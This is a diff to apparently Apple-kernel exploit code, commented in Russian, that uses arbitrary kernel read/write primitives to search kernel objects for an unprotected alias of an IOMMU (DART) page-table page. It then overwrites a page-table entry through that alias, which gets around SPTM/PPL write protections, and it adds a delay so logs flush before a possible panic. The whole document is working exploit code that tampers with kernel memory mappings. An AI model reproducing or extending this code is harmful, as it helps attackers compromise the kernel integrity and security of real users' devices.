@@ -7077,8 +7077,50 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
         }
         if (pteVA) {
+            // 1.9.195: ЗАПИСЬ ЧЕРЕЗ PHYSMAP-АЛИАС = ПАНИКА (доказано 01:51: x1=pteVA).
+            // SPTM держит per-page права на апертуру: DART-таблицы RO через physmap,
+            // PPL CPU-таблицы фолтят даже на чтение (убийца 0x1000a1c000). Но сам
+            // IODARTFamily пишет PTE ежедневно — через ДРУГОЙ алиас той же страницы
+            // (zone-map/служебная карта), который SPTM не охраняет. Ищем указатель P
+            // среди объектов цепочки с kvtophys(P) на той же странице, что ptePA.
+            uint64_t ptePagePA = ptePA190 & ~0x3fffULL;
+            uint64_t aliasVA = 0;
+            uint64_t pools[8] = { mapVA, dartVA, pipeVA, provVA,
+                                  kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xc10)) : 0, 0, 0, 0 };
+            uint32_t poolSz[8] = { 0xa78, 0x1000, 0x400, 0x200, 0x200, 0, 0, 0 };
+            // сегментные структуры mapper'а — вероятнейшие держатели табличных VA
+            int npool = 5;
+            for (uint32_t sg = 0; sg < 3 && npool < 8; sg++) {
+                uint64_t s = kpLooksLikeKernelPointer(mapVA) ? kp_untag_ptr(early_kread64(mapVA + 0x170 + (uint64_t)sg * 8)) : 0;
+                if (kpLooksLikeKernelPointer(s) && kpSafeToRead(s)) { pools[npool] = s; poolSz[npool] = 0xa0; npool++; }
+            }
+            int nAlias = 0;
+            for (int pi = 0; pi < npool && !aliasVA; pi++) {
+                uint64_t obj = pools[pi];
+                if (!kpLooksLikeKernelPointer(obj) || !kpSafeToRead(obj)) continue;
+                for (uint32_t o = 0; o + 8 <= poolSz[pi] && !aliasVA; o += 8) {
+                    uint64_t P = kp_untag_ptr(early_kread64(obj + o));
+                    if (!kpLooksLikeKernelPointer(P)) continue;
+                    uint64_t ppa = kvtophys(P);
+                    if (ppa && (ppa & ~0x3fffULL) == ptePagePA) {
+                        aliasVA = (P & ~0x3fffULL) | (pteVA & 0x3fffULL);
+                        kpNote(r, [NSString stringWithFormat:@"  [P4] ★ АЛИАС таблицы: pool%d+%#x P=%#llx → запись через %#llx (минуя physmap)",
+                                  pi, o, (unsigned long long)P, (unsigned long long)aliasVA]);
+                    }
+                    if (ppa && (ppa & 0xfffff000000ULL) == (ptePagePA & 0xfffff000000ULL)) nAlias++;   // соседи для статистики
+                }
+            }
+            if (!aliasVA) {
+                kpNote(r, [NSString stringWithFormat:@"  [P4] алиас не найден (соседей по PA: %d) — запись через physmap ОТМЕНЕНА (SPTM RO, паника 01:51). Нужен RE адресации таблиц драйвера", nAlias]);
+                pteVA = 0;
+            } else {
+                pteVA = aliasVA;   // дальше патч/чек идут через алиас
+            }
+        }
+        if (pteVA) {
             uint64_t newPTE = (origPTE & ~ptePAMask) | (ctlPA & ptePAMask);
             kpNote(r, [NSString stringWithFormat:@"  [P2] ПОДМЕНА PTE %#018llx → %#018llx", (unsigned long long)origPTE, (unsigned long long)newPTE]);
+            usleep(4000);   // 1.9.195: os_log должен уйти до возможной паники на записи
             early_kwrite64(pteVA, newPTE);
             uint64_t rb = early_kread64(pteVA);
             kpNote(r, [NSString stringWithFormat:@"  [P2] readback PTE = %#018llx — %@",
